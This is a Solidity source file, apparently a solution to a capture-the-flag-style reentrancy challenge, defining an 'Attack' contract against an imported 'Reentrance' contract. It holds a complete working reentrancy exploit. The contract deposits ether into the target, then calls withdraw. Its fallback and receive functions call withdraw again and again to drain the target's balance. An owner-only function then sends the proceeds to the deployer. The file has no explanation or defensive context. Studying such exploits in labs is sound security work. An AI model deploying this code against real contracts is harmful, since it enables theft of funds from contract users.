// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrance.sol";

contract Attack {

    Reentrance public vulnerableContract;
    uint256 public amount;
    address public owner;

    constructor(Reentrance _vulnerableContract){
        owner = msg.sender;
        vulnerableContract = _vulnerableContract;
    }

    function chaaraa() public payable {
        amount = msg.value;
        vulnerableContract.donate{value: msg.value}(address(this));
    }

    function attack() public {
        vulnerableContract.withdraw(amount);
    }

    function withdraw() public {
        require(msg.sender == owner, "CHOR");
        (bool pass, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(pass, "ERROR");
    }

    fallback() external payable {
        vulnerableContract.withdraw(amount);
    }

    receive() external payable {
        vulnerableContract.withdraw(amount);
    }
    
}